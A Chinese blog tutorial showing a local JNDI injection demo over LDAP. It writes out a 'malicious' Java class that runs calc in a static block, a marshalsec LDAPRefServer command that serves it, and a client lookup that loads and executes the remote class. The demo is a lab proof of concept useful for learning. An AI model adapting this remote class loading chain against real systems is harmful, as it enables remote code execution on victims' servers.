[(120条消息) JNDI注入demo使用ldap方式\_jndi demo\_JAVA道人的博客-CSDN博客](https://blog.csdn.net/dmw412724/article/details/121891284)

![](https://csdnimg.cn/release/blogv2/dist/pc/img/original.png)

[JAVA道人](https://blog.csdn.net/dmw412724 "JAVA道人") ![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png) 于 2021-12-12 18:32:26 发布 ![](https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png) 1243 ![](https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png) 收藏 1

版权声明：本文为博主原创文章，遵循 [CC 4.0 BY-SA](http://creativecommons.org/licenses/by-sa/4.0/) 版权协议，转载请附上原文出处链接和本声明。

## JNDI注入demo

JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。

这些命名/目录服务提供者:

RMI (JAVA远程方法调用)  
LDAP (轻量级目录访问协议)  
CORBA (公共对象请求代理[体系结构](https://so.csdn.net/so/search?q=%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84&spm=1001.2101.3001.7020))  
DNS (域名服务)

> 大致说下原理，JNDI可以获取远程类并在当前环境里面执行。  
> 如果我们知道的某个程序某一处执行了JNDI，那么我们编写一个恶意类让其访问获取，就可以做很多事情了。  
> 当前demo使用的是ldap协议

## 一。准备工作

### 1.编写一个恶意类Muma.

里面调用了calc，这个相当于调用了一个计算器。

```
public class Muma {
static {
try {
Runtime.getRuntime().exec("calc").waitFor();
} catch (Exception  e1) {
e1.printStackTrace();
}
}
}
```

值得注意的是，这里面不能有package。

### 2.编译Muma

```
javac Muma.java 
```

然后我们获得了Muma.class

### 3.把Muma.class放到服务器上面。

本例放到tomcat的ROOT下面。  
启动tomcat,http://localhost:8080/Muma.class可以获取到该文件。

### 4.架设ldap服务器。

-   下载marshalsec安全工具。github下载代码https://github.com/mbechler/marshalsec
-   使用maven打包，mvn clean package -DskipTests。这里生成个marshalsec-0.0.3-SNAPSHOT-all.jar,注意是里面的带all的jar
-   使用jar架设ldap服务器

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080#Muma 9527
```

这里访问了上面的8080Muma，架设完成，架设好的ldap服务器端口是9527。  
额外提下，这个marshalsec还可以架设rmi服务器，总体架设格式如下：

```
java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
```

到此为止，我们的准备工作做好了。然后我们做个客户端来访问下这个ldap服务。

### 4.测试

```
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LdapClient {
public static void main(String[] args) throws NamingException {
Context context = new  InitialContext();
context.lookup("ldap://127.0.0.1:9527/Muma");
}
}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b0b3186d985946729be0c9ba42b7f914.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASkFWQemBk-S6ug==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

相当的的NICE！！！